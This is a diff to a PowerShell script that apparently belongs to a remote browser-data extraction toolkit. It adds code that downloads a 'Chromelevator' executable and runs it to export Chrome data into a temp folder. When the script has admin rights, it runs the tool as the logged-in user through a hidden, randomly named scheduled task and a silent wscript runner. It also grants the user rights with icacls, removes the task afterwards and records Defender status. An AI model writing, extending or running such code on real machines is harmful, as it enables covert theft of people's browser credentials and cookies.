@@ -686,6 +686,130 @@ function Get-ChromelevatorChromeRoot {
     return $null
 }
 
+function Get-ChromelevatorOutputDirectory {
+    if ($UserContext -and $UserContext.TargetLocalAppData) {
+        $tempRoot = Join-Path $UserContext.TargetLocalAppData "Temp"
+        New-Item -ItemType Directory -Path $tempRoot -Force | Out-Null
+        return Join-Path $tempRoot ("chrome_export_" + [Guid]::NewGuid().ToString("N"))
+    }
+
+    return Join-Path $env:TEMP ("chrome_export_" + [Guid]::NewGuid().ToString("N"))
+}
+
+function Resolve-InteractiveTaskPrincipal {
+    if ($UserContext.InteractiveQualifiedName) {
+        return [string]$UserContext.InteractiveQualifiedName
+    }
+
+    if ($UserContext.TargetUsername) {
+        return "$env:COMPUTERNAME\$($UserContext.TargetUsername)"
+    }
+
+    return $null
+}
+
+function Should-RunChromelevatorAsInteractiveUser {
+    if (-not $IsRunningAsAdmin) {
+        return $false
+    }
+
+    return [bool](Resolve-InteractiveTaskPrincipal)
+}
+
+function Grant-AccountPathAccess {
+    param(
+        [string]$Path,
+        [string]$AccountName,
+        [string]$Rights = "(OI)(CI)F"
+    )
+
+    if (-not $Path -or -not $AccountName -or -not (Test-Path -LiteralPath $Path)) {
+        return $false
+    }
+
+    try {
+        $null = & icacls $Path /grant "${AccountName}:${Rights}" /T /C 2>&1
+        return $true
+    }
+    catch {
+        return $false
+    }
+}
+
+function Invoke-ChromelevatorAsInteractiveUser {
+    param(
+        [string]$ElevatorPath,
+        [string]$OutDir,
+        [string]$RunAsUser
+    )
+
+    New-Item -ItemType Directory -Path $OutDir -Force | Out-Null
+    Grant-AccountPathAccess -Path $OutDir -AccountName $RunAsUser | Out-Null
+    Grant-AccountPathAccess -Path $ElevatorPath -AccountName $RunAsUser -Rights "RX" | Out-Null
+
+    $taskName = "RemoteScripts_ChromElev_" + [Guid]::NewGuid().ToString("N")
+    $exitCodePath = Join-Path $OutDir "chromelevator.exitcode"
+    $runnerPath = Join-Path $OutDir "run_chromelevator.vbs"
+    $runnerContent = @"
+Set shell = CreateObject("Wscript.Shell")
+exitCode = shell.Run("""$ElevatorPath"" -o ""$OutDir"" chrome", 0, True)
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set file = fso.CreateTextFile("$exitCodePath", True)
+file.Write exitCode
+file.Close
+"@
+    Set-Content -LiteralPath $runnerPath -Value $runnerContent -Encoding ASCII
+    Grant-AccountPathAccess -Path $runnerPath -AccountName $RunAsUser -Rights "RX" | Out-Null
+
+    try {
+        $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B `"$runnerPath`""
+        $principal = New-ScheduledTaskPrincipal -UserId $RunAsUser -LogonType Interactive -RunLevel Limited
+        $settings = New-ScheduledTaskSettingsSet `
+            -AllowStartIfOnBatteries `
+            -DontStopIfGoingOnBatteries `
+            -StartWhenAvailable `
+            -ExecutionTimeLimit (New-TimeSpan -Minutes 5) `
+            -Hidden
+        Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Settings $settings -Force | Out-Null
+
+        if ($DebugMode) {
+            Write-DebugStep "Chromelevator scheduled as $RunAsUser (task=$taskName, outDir=$OutDir)"
+        }
+
+        Start-ScheduledTask -TaskName $taskName
+
+        $deadline = [DateTime]::UtcNow.AddMinutes(5)
+        do {
+            Start-Sleep -Milliseconds 750
+            if (Test-Path -LiteralPath $exitCodePath) {
+                break
+            }
+
+            $taskState = "Unknown"
+            try {
+                $taskState = [string](Get-ScheduledTask -TaskName $taskName -ErrorAction Stop).State
+            }
+            catch {
+            }
+        } while ([DateTime]::UtcNow -lt $deadline -and $taskState -eq "Running")
+
+        if (-not (Test-Path -LiteralPath $exitCodePath)) {
+            Throw-ErrorCode 2003
+        }
+
+        $exitCode = [int](Get-Content -LiteralPath $exitCodePath -Raw -ErrorAction Stop)
+        if ($exitCode -ne 0) {
+            if ($DebugMode) {
+                Write-DebugStep "Chromelevator interactive task exit code: $exitCode"
+            }
+            Throw-ErrorCode 2003
+        }
+    }
+    finally {
+        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+    }
+}
+
 function Invoke-ChromelevatorProcess {
     param(
         [string]$ElevatorPath,
@@ -721,6 +845,8 @@ function Invoke-ChromelevatorExtraction {
         error = $null
         skipped = $false
         defender = $ChromelevatorDefenderStatus
+        runAsInteractiveUser = $false
+        interactiveUser = $null
     }
 
     if (-not $UseChromelevator) {
@@ -747,9 +873,29 @@ function Invoke-ChromelevatorExtraction {
         $archTag = if ($env:PROCESSOR_ARCHITECTURE -eq "ARM64") { "arm64" } else { "x64" }
         $meta.arch = $archTag
         $elevatorPath = Get-ChromelevatorExecutable -ApiBase $ApiBase -ArchTag $archTag -CacheDir $ChromelevatorCacheDir
-        $outDir = Join-Path $env:TEMP ("chrome_export_" + [Guid]::NewGuid().ToString("N"))
+        $outDir = Get-ChromelevatorOutputDirectory
         New-Item -ItemType Directory -Path $outDir -Force | Out-Null
-        Invoke-ChromelevatorProcess -ElevatorPath $elevatorPath -OutDir $outDir
+
+        $runAsInteractiveUser = Should-RunChromelevatorAsInteractiveUser
+        $interactivePrincipal = Resolve-InteractiveTaskPrincipal
+        if ($runAsInteractiveUser -and $interactivePrincipal) {
+            $meta.runAsInteractiveUser = $true
+            $meta.interactiveUser = $interactivePrincipal
+            try {
+                Invoke-ChromelevatorAsInteractiveUser -ElevatorPath $elevatorPath -OutDir $outDir -RunAsUser $interactivePrincipal
+            }
+            catch {
+                if ($DebugMode) {
+                    Write-DebugStep "Interactive chromelevator task failed: $($_.Exception.Message); falling back to direct invoke"
+                }
+                Invoke-ChromelevatorProcess -ElevatorPath $elevatorPath -OutDir $outDir
+                $meta.runAsInteractiveUser = $false
+            }
+        }
+        else {
+            Invoke-ChromelevatorProcess -ElevatorPath $elevatorPath -OutDir $outDir
+        }
+
         $meta.used = $true
     }
     catch {
